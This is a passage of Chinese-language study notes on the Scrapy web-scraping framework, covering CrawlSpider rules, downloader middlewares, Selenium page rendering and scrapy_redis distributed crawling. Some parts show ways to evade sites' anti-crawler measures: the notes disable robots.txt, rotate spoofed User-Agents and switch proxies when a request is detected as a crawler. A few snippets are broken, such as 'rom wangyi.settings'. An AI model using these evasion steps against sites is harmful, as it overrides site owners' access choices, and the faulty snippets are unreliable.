4. dont_filter:## 默认为False，会过滤请求的url地址，即请求过的url地址不会继续被请求，对需要重复请求的url地址可以把它设置为Ture，比如贴吧的翻页请求，页面的数据总是在变化;start_urls中的地址会被反复请求，否则程序不会启动
5. method：## 指定POST或GET请求
6. headers：## 接收一个字典，其中不包括cookies
7. cookies：## 接收一个字典，专门放置cookies
8. body： ## 传递数据  字符串格式   为POST的数据
```

#### 4-5-3 meta参数的作用

**meta的形式:字典**

**meta的作用：meta可以实现数据在不同的解析函数中的传递**

在爬虫文件的parse方法中，提取详情页增加之前callback指定的parse_detail函数：

```Python
def parse(self,response):
    ...
    yield scrapy.Request(detail_url, callback=self.parse_detail,meta={"item":item})
...

def parse_detail(self,response):
    #获取之前传入的item
    item = resposne.meta["item"]
```

**特别注意**

1. meta参数是一个字典
2. meta字典中有一个固定的键`proxy`，表示代理ip，关于代理ip的使用我们将在scrapy的下载中间件的学习中进行介绍

#### 4-5-4 scrapy抓取四大名著

爬虫的代码

```python
import scrapy


class SdmzSpider(scrapy.Spider):
    name = 'sdmz'
    # allowed_domains = ['www.com']
    start_urls = ['https://www.shicimingju.com/bookmark/sidamingzhu.html']

    def parse(self, response, **kwargs):
        # 获取四大名著的书名和url
        a_list = response.xpath('//div[@class="book-item"]/h3/a')
        for a in a_list:
            book_url = response.urljoin(a.xpath('./@href').extract_first())
            book_name = a.xpath('./text()').extract_first()
            # print(book_url, book_name)
            # 传递书给下一个方法 用于最终创建书存储的路径
            yield scrapy.Request(book_url, callback=self.parse_mulu, meta={'book_name': book_name})

    # 处理书的章节的
    def parse_mulu(self, response, **kwargs):
        book_name = response.meta['book_name']
        # 获取书的章节和url
        a_list = response.xpath('//div[@class="book-mulu"]/ul/li/a')
        for a in a_list:
            mulu_url = response.urljoin(a.xpath('./@href').extract_first())
            mulu_name = a.xpath('./text()').extract_first()
            # 对章节url进行请求 并携带当前书名 章节名称 方便后续创建存储目录
            yield scrapy.Request(mulu_url, callback=self.parse_content, meta={'book_name': book_name, 'mulu_name': mulu_name})

    # 解析章节的内容
    def parse_content(self, response, **kwargs):
        # 获取书名， 章节名称，目的为了管道中进行目录层级的创建
        book_name = response.meta['book_name']
        mulu_name = response.meta['mulu_name']
        contnet = ''.join(response.xpath('//div[@class="card bookmark-list"]//text()').extract())
        # 将书名，章节名，章节的内容传递到管道 进行下载
        yield {'book_name': book_name, 'mulu_name': mulu_name, 'contnet': contnet}
        # print({'book_name': book_name, 'mulu_name': mulu_name, 'contnet': contnet})



```

管道的代码

```Python
# Define your item pipelines here
#
# Don't forget to add your pipeline to the ITEM_PIPELINES setting
# See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html


# useful for handling different item types with a single interface
from itemadapter import ItemAdapter
import os

class SidamingzhuPipeline:
    def process_item(self, item, spider):
        # 书名
        book_name = item['book_name']
        # 章节名称
        mulu_name = item['mulu_name']
        # 章节内容
        contnet = item['contnet']
        # 判断当前书的目录是否存在
        # if not os.path.exists(book_name):
        #     os.mkdir(book_name)
        total = '四大名著'
        # 加一个总目录
        """
        四大名著    
            水浒
            三国
            ...
        """
        dir = os.path.join(total, book_name)
        if not os.path.exists(dir):
            os.makedirs(dir)  # 递归创建
        # 拼接路径 书的路径
        path = os.path.join(dir, mulu_name+'.txt')
        # 写入到本地
        with open(path, 'w', encoding='UTF-8') as f:
            f.write(contnet)
        print(book_name, mulu_name, '下载完成')


```

#### 4-5-5 item.py的作用

##### 4-5-1 Item能够做什么

+ 定义item即提前规划好哪些字段需要抓取，scrapy.Field()仅仅是提前占坑，通过item.py能够让别人清楚自己的爬虫是在抓取什么，同时定义好哪些字段是需要抓取的，没有定义的字段不能使用，防止手误

+ 在python大多数框架中，大多数框架都会自定义自己的数据类型(在python自带的数据结构基础上进行封装)，目的是增加功能，增加自定义异常

##### 4-5-2 定义Item

在items.py文件中定义要提取的字段：

```python
import scrapy

class DoubanItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    name = scrapy.Field()     # 电影名称
    director = scrapy.Field()     # 导演
    screenwriter = scrapy.Field()    # 编剧
    to_star = scrapy.Field()    # 主演
```

### 4-6  crawlspider爬虫

#### 6-1 crawlspider是什么

> 回顾之前的代码中，我们有很大一部分时间在寻找下一页的url地址或者是内容的url地址上面，这个过程能更简单一些么？

**思路：**

1. 从response中提取所有的满足规则的url地址
2. 自动的构造自己requests请求，发送给引擎

对应的**crawlspider就可以实现上述需求，能够匹配满足条件的url地址，组装成Reuqest对象后自动发送给引擎，同时能够指定callback函数**

**即：crawlspider爬虫可以按照规则自动获取连接**

#### 6-2  创建crawlspider

```python
scrapy startproject project

cd project

scrapy genspider -t crawl dz duanzixing.com
```

进行settings.py配置

#### 6-3 Rules规则

```python
import scrapy
from scrapy.linkextractors import LinkExtractor
from scrapy.spiders import CrawlSpider, Rule

## 继承的是CrawISpider
class DzSpider(CrawlSpider):
    name = 'dz'
    # allowed_domains = ['dz.com']
    start_urls = ['https://duanzixing.com/']
    # 规则
    '''
    https://duanzixing.com/page/2/
    https://duanzixing.com/page/3/
    '''
    rules = (
        # 参数一 链接提取器 必须的（给定一个规则  他舅会按照这个规则进行url的匹配并请求）默认使用的是正则！！！
        # 参数二 回调 请求后的响应交给谁 跟之前的区别是 没有self
        # 参数三  是否进入再次匹配  如果不想改为False
        
        # Rule(LinkExtractor(allow=r'page/\d+/'), callback='parse_item', follow=False),
        # Rule(LinkExtractor(allow=r'page/\d+/'), callback='parse_item', follow=True),
        # Rule(LinkExtractor(allow=r'https://duanzixing\.com/page/\d+/'), callback='parse_item', follow=False),
        # 抓取所有超链接
        # Rule(LinkExtractor(allow=r''), callback='parse_item', follow=False),
        # 使用正则进行匹配
        Rule(LinkExtractor(restrict_xpaths='/html/body/section/div/div/div[2]/ul/li/a'), callback='parse_item', follow=False),

    )

    def parse_item(self, response):
        item = {}
        print(response.url)
        # print(response.url)
        # response.xpath('//article[@class="excerpt"]/header/a/text()').extract()
        # response.xpath('//article[@class="excerpt"]/p[@class="note"]/text()').extract()
        # article_list = response.xpath('//article[@class="excerpt"]')
        # for article in article_list:
        #     title = article.xpath('./header/h2/a/text()').extract_first()
        #     con = article.xpath('./p[@class="note"]/text()').extract_first()
        #     print(title, con, response.url)
        return item
```

#### 6-4  跟scrapy.spider的区别

在crawlspider爬虫中，没有parse函数

**重点在rules中：**

1. rules是一个元组或者是列表，包含的是Rule对象
2. Rule表示规则，其中包含LinkExtractor,callback和follow等参数
3. LinkExtractor:连接提取器，可以通过正则或者是xpath来进行url地址的匹配
4. callback :表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数的处理
5. follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，True表示会，Flase表示不会

#### 6-5  crawlspider注意点：

1. 除了用命令`scrapy genspider -t crawl <爬虫名> <allowed_domail>`创建一个crawlspider的模板，页可以手动创建
2. crawlspider中不能再有以parse为名的数据提取方法，该方法被crawlspider用来实现基础url提取等功能
3. Rule对象中LinkExtractor为固定参数，其他callback、follow为可选参数
4. 不指定callback且follow为True的情况下，满足rules中规则的url还会被继续提取和请求
5. 如果一个被提取的url满足多个Rule，那么会从rules中选择一个满足匹配条件的Rule执行

#### 6-6 LinkExtractor的更多常见参数

- - allow: 满足括号中的're'表达式的url会被提取，如果为空，则全部匹配

  - deny: 满足括号中的're'表达式的url不会被提取，优先级高于allow

  - allow_domains: 会被提取的链接的domains(url范围)，如：`['https://movie.douban.com/top250']`

  - deny_domains: 不会被提取的链接的domains(url范围)

  - **restrict_xpaths: 使用xpath规则进行匹配，和allow共同过滤url，即xpath满足的范围内的url地址会被提取**

    如：`restrict_xpaths='//div[@class="pagenav"]'`

  - restrict_css: 接收一堆css选择器, 可以提取符合要求的css选择器的链接

  - attrs: 接收一堆属性名, 从某个属性中提取链接, 默认href

  - tags: 接收一堆标签名, 从某个标签中提取链接, 默认a, area

  值得注意的, **在提取到的url中, 是有重复的内容的. 但是我们不用管. scrapy会自动帮我们过滤掉重复的url请求**

- 模拟使用

　　正则用法：　links1 = LinkExtractor(allow=r'list_23_\d+\.html')

　　xpath用法： links2 = LinkExtractor(restrict_xpaths=r'//div[@class="x"]')

　	css用法：  links3 = LinkExtractor(restrict_css='.x')

5.提取连接

- Rule常见参数

  - LinkExtractor: 链接提取器，可以通过正则或者是xpath来进行url地址的匹配
  - callback: 表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数的处理
  - follow: 连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，默认True表示会，Flase表示不会
  - process_links: 当链接提取器LinkExtractor获取到链接列表的时候调用该参数指定的方法，这个自定义方法可以用来过滤url，且这个方法执行后才会执行callback指定的方法

#### 6-7 总结

1. crawlspider的作用：crawlspider可以按照规则自动获取连接
2. crawlspider爬虫的创建：scrapy genspider -t crawl xxx  www.xxx.com
3. crawlspider中rules的使用：
   + rules是一个元组或者是列表，包含的是Rule对象
   + Rule表示规则，其中包含LinkExtractor,callback和follow等参数
   + LinkExtractor:连接提取器，可以通过正则或者是xpath来进行url地址的匹配
   + callback :表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数的处理
   + follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，True表示会，Flase表示不会

## 5，scrapy中间件

### 5-1 scrapy中间件的作用

```python
1. 主要功能是在爬虫运行过程中进行一些处理，如对非200响应的重试（重新构造Request对象yield给引擎）
2. 也可以对header以及cookie进行更换和处理
3. 其他根据业务需求实现响应的功能
```

但在scrapy默认的情况下 两种中间件都在middlewares.py一个文件中

爬虫中间件使用方法和下载中间件相同，常用下载中间件

### 5-2 下载中间件的使用方法

> 接下来我们对爬虫进行修改完善，通过下载中间件来学习如何使用中间件 编写一个Downloader Middlewares和我们编写一个pipeline一样，定义一个类，然后在setting中开启

Downloader Middlewares默认的方法：在中间件类中，有时需要重写处理请求或者响应的方法】

- process_request(self, request, spider)：【此方法是用的最多的】

  ```python
  - ## 当每个request通过下载中间件时，该方法被调用。
  - ## 返回None值：继续请求  没有return也是返回None，该request对象传递给下载器，或通过引擎传递给其他权重低的process_request方法 【如果所有的下载器中间件都返回为None，则请求最终被交给下载器处理】
  - ## 返回Response对象：不再请求，把response返回给引擎【如果返回为请求，则将请求交给调度器】
  - ##  返回Request对象：把request对象交给调度器进行后续的请求  
  ```

  

- process_response(self, request, response, spider)：

  ```python
  - ## 当下载器完成http请求，传递响应给引擎的时候调用
  - ## 返回Resposne：通过引擎交给爬虫处理或交给权重更低的其他下载中间件的process_response方法 【如果返回为请求，则将请求交给调度器】
  - ## 返回Request对象：交给调取器继续请求，此时将不通过其他权重低的process_request方法 
  ```

- process_exception(self, request, exception, spider):

  + 请求出现异常的时候进行调用

  + 比如当前请求被识别为爬虫 可以使用代理

    ```python
    def process_exception(self, request, exception, spider):
    	request.meta['proxy'] = 'http://ip地址'
      	request.dont_filter = True  # 因为默认请求是去除重复的，因为当前已经请求过，所以需要设置当前为不去重
    	return request  # 将修正后的对象重新进行请求
    ```

- 在settings.py中配置开启中间件，权重值越小越优先执行  【同管道的使用方式相同】

- spider参数：为爬虫中类的实例化可以在这里进行调用爬虫中的属性

  如：spider.name

### 5-3 中间件的简单使用

spiders.py（爬虫代码）news.163.com/domestic/

```python
import scrapy


class DzSpider(scrapy.Spider):
    name = 'dz'
    # allowed_domains = ['duanzixing.com']
    start_urls = ['https://duanzixing.com/']

    def parse(self, response, **kwargs):
        print(response.request.headers)

```

settings.py(开启中间件)

也别忘了其他的配置（前面学习过程中讲过了）

```python
DOWNLOADER_MIDDLEWARES = {
   'wangyi.middlewares.WangyiDownloaderMiddleware': 543,
}
```

middlewares.py

```python
from scrapy import signals


# 导入随机ua
from zhongjianjian01.settings import USER_AGENTS_LIST
import random

class Zhongjianjian01DownloaderMiddleware:
    # Not all methods need to be defined. If a method is not defined,
    # scrapy acts as if the downloader middleware does not modify the
    # passed objects.

    @classmethod
    def from_crawler(cls, crawler):
        # This method is used by Scrapy to create your spiders.
        s = cls()
        crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)
        return s

    def process_request(self, request, spider):
        # 随机ua
        ua = random.choice(USER_AGENTS_LIST)
        request.headers['User-Agent'] = ua
        print(request.headers['User-Agent'])
        print('process_request')
        return None

    def process_response(self, request, response, spider):
        print('process_response')
        return response

    def process_exception(self, request, exception, spider):
        print('process_exception', exception)

    def spider_opened(self, spider):
        spider.logger.info('Spider opened: %s' % spider.name)
```

运行查看

### 5-4 随机请求头

#### 5-4-1 在settings中添加UA的列表

```Python
USER_AGENTS_LIST = [ 
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", 
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", 
"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5" 
]
```

#### 5-4-2 在middlewares.py中完善代码

```Python
import random
from Tencent.settings import USER_AGENTS_LIST # 注意导入路径,请忽视pycharm的错误提示

class UserAgentMiddleware(object):
    def process_request(self, request, spider):
        user_agent = random.choice(USER_AGENTS_LIST)
        request.headers['User-Agent'] = user_agent
```

#### 5-4-3 在爬虫文件tencent.py的每个解析函数中添加

```python
class CheckUA:
    def process_response(self,request,response,spider):
        print(request.headers['User-Agent'])
```

#### 5-4-4 在settings中设置开启自定义的下载中间件，设置方法同管道

```python
DOWNLOADER_MIDDLEWARES = {
   'Tencent.middlewares.UserAgentMiddleware': 543,
}
```

### 5-5 代理ip的使用

#### 5-5-1 思路分析

1. 代理添加的位置：request.meta中增加`proxy`字段

2. 获取一个代理ip，赋值给

   ```python
   request.meta['proxy']
   ```

   - 代理池中随机选择代理ip
   - 代理ip的webapi发送请求获取一个代理ip

#### 5-5-2 具体实现

```python
class ProxyMiddleware(object):
    def process_request(self,request,spider):
        proxy = random.choice(proxies) # proxies可以在settings.py中，也可以来源于代理ip的webapi
        # proxy = 'http://192.168.1.1:8118'
        request.meta['proxy'] = proxy
        return None # 可以不写return
```

#### 5-5-3 检测代理ip是否可用

在使用了代理ip的情况下可以在下载中间件的process_response()方法中处理代理ip的使用情况，如果该代理ip不能使用可以替换其他代理ip

```python
class ProxyMiddleware(object):
    def process_response(self, request, response, spider):
        if response.status != '200' and response.status != '302':
            #此时对代理ip进行操作，比如删除
            return request
```

#### 5-5-4  快代理的购买与使用

网址：https://www.kuaidaili.com/

- 输入网址   点击购买代理

![image-20240129152111294](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152111294.png)

- 选择你想购买代理的类型

![image-20240129152148323](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152148323.png)

- 以隧道代理为例  点击购买

![image-20240129152245537](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152245537.png)

- 购买后点击 文档中心

![image-20240129152310495](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152310495.png)

- 点击

![image-20240129152339211](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152339211.png)

- 选择隧道代理

![image-20240129152406156](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152406156.png)

- 向下拉 选择你当前要使用代理的模块


我们是scrapy使用隧道 所以选择   **Python-Scrapy**

![image-20240129152433625](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152433625.png)

- 找到**middlewares.py**

![image-20240129152501046](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152501046.png)

- 将中间件类代码复制到当前自己scrapy的中间件得文件中即可

![image-20240129152528134](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240129152528134.png)

按照步骤开启中间件与填写自己的用户名与密码等信息即可

### 5-6 总结

中间件的使用：

1. 完善中间件代码：
   - process_request(self, request, spider)：
     - 当每个request通过下载中间件时，该方法被调用。
     - 返回None值：继续请求
     - 返回Response对象：不再请求，把response返回给引擎
     - 返回Request对象：把request对象交给调度器进行后续的请求
   - process_response(self, request, response, spider)：
     - 当下载器完成http请求，传递响应给引擎的时候调用
     - 返回Resposne：交给process_response来处理
     - 返回Request对象：交给调取器继续请求
2. 需要在settings.py中开启中间件 DOWNLOADER_MIDDLEWARES = { 'myspider.middlewares.UserAgentMiddleware': 543, }

### 5-7 抓取网易新闻（selenium）

url：https://news.163.com/

#### 5-7-1 爬取前准备

+ scrapy startproject wangyi
+ cd wangyi
+ scrapy genspider wy  https://news.163.com/

#### 5-7-2 爬取前分析

抓取 国内 国际 军事 航空

+ 分析 

  国内等数据是由动态加载的 并不是跟着当前的请求一起返回的 

  ![image-20220509095648595](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20220509095648595.png)

  解决方式2种

  1. 通过selenium配合爬虫抓取页面进行数据

  2. 找到加载动态数据的url地址  通过爬虫进行抓取

     ![image-20220509100159399](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20220509100159399.png)

     ![image-20220509100235422](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20220509100235422.png)

  ![image-20220509100359070](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20220509100359070.png)

  将找到的URL放到浏览器中进行请求  效果如下

  ![image-20220509100447858](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20220509100447858.png)

#### 5-7-3 代码配置

配置文件处理settings.py

```Python
# Scrapy settings for wangyi project
BOT_NAME = 'wangyi'

SPIDER_MODULES = ['wangyi.spiders']
NEWSPIDER_MODULE = 'wangyi.spiders'

# 默认请求头
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'

# 用于更换随机请求头
USER_AGENTS_LIST = [
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5" ]

LOG_LEVEL = 'ERROR'
ROBOTSTXT_OBEY = False

DOWNLOADER_MIDDLEWARES = {
   'wangyi.middlewares.WangyiDownloaderMiddleware': 543,
}
ITEM_PIPELINES = {
   'wangyi.pipelines.WangyiPipeline': 300,
}
```

爬虫代码wy.py

```Python
import scrapy
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options

# 一定重新下载谷歌驱动！！！！！

class WySpider(scrapy.Spider):
    name = 'wy'

    opt = Options()
    opt.add_argument("--headless")
    # opt.add_argument('--disable-gpu')
    # 实例化selenium对象
    web = Chrome(options=opt)


    # allowed_domains = ['news.163.com/domestic/']
    start_urls = ['https://news.163.com/']
    li_index = [1, 2]
    url_list = []  # 存放国内和国际的url
    def parse(self, response, **kwargs):
        # 抓取我们要访问的url  国内 国际
        menu_list = response.xpath('//div[@class="ns_area list"]/ul/li/a/@href').extract()
        for i in range(len(menu_list)):
            if i in self.li_index:
                url = menu_list[i]  # 取出国内  国际的url
                self.url_list.append(url)
                yield scrapy.Request(url, callback=self.parse_page)

    # 解析国内，国际页面的数据
    def parse_page(self, response, **kwargs):
        # 解析新闻详情的url
        page_detail_url = response.xpath('//div[@class="ndi_main"]/div/a/@href').extract()
        for url in page_detail_url:
            yield scrapy.Request(url, callback=self.parse_page_detail)

    # 解析新闻详情
    def parse_page_detail(self, response, **kwargs):
        title = response.xpath('//h1[@class="post_title"]/text()').extract_first()
        # 新闻内容
        con = ''.join(response.xpath('//div[@class="post_main"]//text()').extract())
        data = {'title': title, 'con': con}
        print(data)
        yield data


```

Middlewares.py

```python
import time
from scrapy import signals
from itemadapter import is_item, ItemAdapter
from scrapy.http import HtmlResponse

rom wangyi.settings import USER_AGENTS_LIST
import random
class WangyiDownloaderMiddleware:
    # Not all methods need to be defined. If a method is not defined,
    # scrapy acts as if the downloader middleware does not modify the
    # passed objects.

    @classmethod
    def from_crawler(cls, crawler):
        # This method is used by Scrapy to create your spiders.
        s = cls()
        crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)
        return s

    def process_request(self, request, spider):
        ua = random.choice(USER_AGENTS_LIST)
        request.headers['User-Agent'] = ua
        return None

    def process_response(self, request, response, spider):
        driver = spider.web   # 拿到selenium对象
        url = request.url
        if url in spider.url_list:
            driver.get(url)  # 开始访问的url
            # 滚动条滚动到底部
            driver.execute_script('window.scrollTo(0, document.body.scrollHeight)')
            time.sleep(random.randint(1, 3))
            driver.execute_script('window.scrollTo(0, document.body.scrollHeight)')
            time.sleep(random.randint(1, 3))
            source = driver.page_source  # 获取页面源代码
            #  篡改响应
            return HtmlResponse(url=url, body=source, encoding='UTF-8', request=request)
        return response

    def process_exception(self, request, exception, spider):
        # Called when a download handler or a process_request()
        # (from other downloader middleware) raises an exception.

        # Must either:
        # - return None: continue processing this exception
        # - return a Response object: stops process_exception() chain
        # - return a Request object: stops process_exception() chain
        pass

    def spider_opened(self, spider):
        spider.logger.info('Spider opened: %s' % spider.name)
```

## 6，scrapy_redis

### 6-1  scrapy_redis分布式原理

**学习目标**

1. 了解 scarpy_redis的概念和功能
2. 了解 scrapy_redis的原理
3. 了解 redis数据库操作命令

------

> 在前面scrapy框架中我们已经能够使用框架实现爬虫爬取网站数据,如果当前网站的数据比较庞大, 我们就需要使用分布式来更快的爬取数据

#### 6-1-1 scrapy_redis是什么

**安装**

pip install scrapy_redis == 0.7.2

#### 6-1-2 为什么要学习scrapy_redis

Scrapy_redis在scrapy的基础上实现了更多，更强大的功能，具体体现在：

- 请求对象的持久化
- 去重的持久化
- 和实现分布式

#### 6-1-3 scrapy_redis的原理分析

##### 3.1 回顾scrapy的流程

![scrapy的流程](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/scrapy%E7%9A%84%E6%B5%81%E7%A8%8B.png)

那么，在这个基础上，如果需要实现分布式，即多台服务器同时完成一个爬虫，需要怎么做呢？

##### 3.2 scrapy_redis的流程

- 在scrapy_redis中，所有的带抓取的对象和去重的指纹都存在所有的服务器公用的redis中
- 所有的服务器公用一个redis中的request对象
- 所有的request对象存入redis前，都会在同一个redis中进行判断，之前是否已经存入过
- 在默认情况下所有的数据会保存在redis中

具体流程如下：

![scrapy_redis的流程](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/scrapy_redis%E7%9A%84%E6%B5%81%E7%A8%8B.png)

#### 6-1-4 对于redis的复习

> 由于时间关系,大家对redis的命令遗忘的差不多了, 但是在scrapy_redis中需要使用redis的操作命令,所有需要回顾下redis的命令操作

##### 4.1 redis是什么

redis是一个开源的内存型数据库，支持多种数据类型和结构，比如列表、集合、有序集合等,同时可以使用redis-manger-desktop等客户端软件查看redis中的数据，关于redis-manger-desktop的使用可以参考扩展阅读

##### 4.2 redis服务端和客户端的启动

- `redis-server.exe redis.windows.conf` 启动服务端
- `redis-cli` 客户端启动

##### 4.3 redis中的常见命令

1. `select 1` 切换db
2. `keys *` 查看所有的键
3. `type 键` 查看键的类型
4. `flushdb` 清空db
5. `flushall` 清空数据库

##### 4.4 redis命令的复习

redis的命令很多，这里我们简单复习后续会使用的命令

![redis命令的复习](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/redis%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A4%8D%E4%B9%A0.png)

#### 6-1-5 小结

scarpy_redis的分布式工作原理

- 在scrapy_redis中，所有的带抓取的对象和去重的指纹都存在所有的服务器公用的redis中
- 所有的服务器公用一个redis中的request对象
- 所有的request对象存入redis前，都会在同一个redis中进行判断，之前是否已经存入过



### 6-2 配置分布式爬虫

配置完成使用分布式爬虫

#### 6-2-1 概述

分布式爬虫

- 使用多台机器搭建一个分布式的机器，然后让他们联合且分布的对同一组资源进行数据爬取
- 原生的scrapy框架是无法实现分布式爬虫？
  - 原因：调度器，管道无法被分布式机群共享
- 如何实现分布式
  - 借助：scrapy-redis组件
  - 作用：提供了可以被共享的管道和调度器
  - 只可以将爬取到的数据存储到redis中

#### 6-2-2 创建分布式crawlspider爬虫

+ scrapy  startproject fbsPro
+ cd fbsPro
+ scrapy genspider -t crawl fbs www.xxx.com

#### 6-2-3 redis-settings需要的配置

1. (必须). 使用了scrapy_redis的去重组件，在redis数据库里做去重

   ```python
   DUPEFILTER_CLASS = "scrapy_redis.dupefilter.RFPDupeFilter"
   ```

2. (必须). 使用了scrapy_redis的调度器，在redis里分配请求

   ```python
   SCHEDULER = "scrapy_redis.scheduler.Scheduler"
   ```

3. (可选). 在redis中保持scrapy-redis用到的各个队列，从而允许暂停和暂停后恢复，也就是不清理redis queues

   ```python
   SCHEDULER_PERSIST = True
   ```

4. (必须). 通过配置RedisPipeline将item写入key为 spider.name : items 的redis的list中，供后面的分布式处理item 这个已经由 scrapy-redis 实现，不需要我们写代码，直接使用即可

   ```python
   ITEM_PIPELINES = {
   　　 'scrapy_redis.pipelines.RedisPipeline': 100 ,
   }
   ```

5. (必须). 指定redis数据库的连接参数

   ```python
   REDIS_HOST = '127.0.0.1' 
   REDIS_PORT = 6379
   REDIS_DB = 0  # (不指定默认为0)
   #  设置密码
   REDIS_PARAMS = {'password': '123456'}
   ```

#### 6-2-4 settings.py

settings.py

这几行表示`scrapy_redis`中重新实现的了去重的类，以及调度器，并且使用的`RedisPipeline`

需要添加redis的地址，程序才能够使用redis

在settings.py文件修改pipelines，增加scrapy_redis。

```python
# 配置分布式
DUPEFILTER_CLASS = "scrapy_redis.dupefilter.RFPDupeFilter"
SCHEDULER = "scrapy_redis.scheduler.Scheduler"
SCHEDULER_PERSIST = True

ITEM_PIPELINES = {
    'scrapy_redis.pipelines.RedisPipeline': 400,
}


# 或者使用下面的方式
REDIS_HOST = "127.0.0.1"
REDIS_PORT = 6379
REDIS_PARAMS = {'password': '123456'}
```

**注意：scrapy_redis的优先级要调高**

#### 6-2-5 爬虫文件代码中 fbs.py

```python
from scrapy_redis.spiders import RedisCrawlSpider

# 注意  一定要继承RedisCrawlSpider
class FbsSpider(RedisCrawlSpider):
    name = 'fbs'
    # allowed_domains = ['www.xxx.com']
    # start_urls = ['http://www.xxx.com/']
    redis_key = 'fbsQueue'  # 使用管道名称（课根据实际功能起名称）
```

#### 6-2-6 scrapy-redis键名介绍

scrapy-redis中都是用key-value形式存储数据，其中有几个常见的key-value形式：

1、 “项目名:items”  -->list 类型，保存爬虫获取到的数据item 内容是 json 字符串

2、 “项目名:dupefilter”   -->set类型，用于爬虫访问的URL去重 内容是 40个字符的 url 的hash字符串

3、 “项目名:requests”   -->zset类型，用于scheduler调度处理 requests 内容是 request 对象的序列化 字符串

#### 5-2-7 完整代码配置

+ 网址

  阳光问政为例

  https://wz.sun0769.com/political/index/politicsNewest

+ settings.py

  ```python
  BOT_NAME = 'fbsPro'
  
  SPIDER_MODULES = ['fbsPro.spiders']
  NEWSPIDER_MODULE = 'fbsPro.spiders'
  
  USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
  
  # Obey robots.txt rules
  ROBOTSTXT_OBEY = False
  
  # 配置分布式
